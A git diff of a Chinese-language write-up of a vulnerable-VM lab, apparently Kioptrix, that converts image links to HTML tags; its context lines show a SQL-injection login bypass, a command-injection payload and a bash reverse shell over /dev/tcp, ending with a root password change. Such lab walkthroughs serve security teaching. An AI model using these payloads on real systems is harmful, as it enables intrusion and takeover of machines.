@@ -101,7 +101,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 访问首页访问源代码，发现一个登录页面：
 
-[1.png](https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/1.png)
+<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/1.png" style="zoom:50%" />
 
 
 ~~~html
@@ -145,15 +145,15 @@ OS and Service detection performed. Please report any incorrect results at https
 >
 > `psw:' or '1'='1`
 
-[!2.png](https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/2.png)
+<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/2.png" style="zoom:50%" />
 
 `payload:127.0.0.1;pwd;whoami;`
 
-[!3.png](https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/3.png)
+<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/3.png" style="zoom:50%" />
 
 寻找写权限的目录：
 
-[!4.png](https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/4.png)
+<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/4.png" style="zoom:50%" />
 
 > 弹shell
 
@@ -161,7 +161,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 `192.168.1.7;bash -c 'exec bash -i &>/dev/tcp/192.168.1.7/8888 <&1';`
 
-[!5.png](https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/5.png)
+<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/5.png" style="zoom:50%" />
 
 
 
@@ -182,4 +182,4 @@ Changing password for user root.
 passwd: all authentication tokens updated successfully.
 ~~~
 
-[!6.png](https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/6.png)
+<img src="https://github.com/eagleatman/mywriteup/blob/main/kipptrix-11-23/images/6.png" style="zoom:50%" />
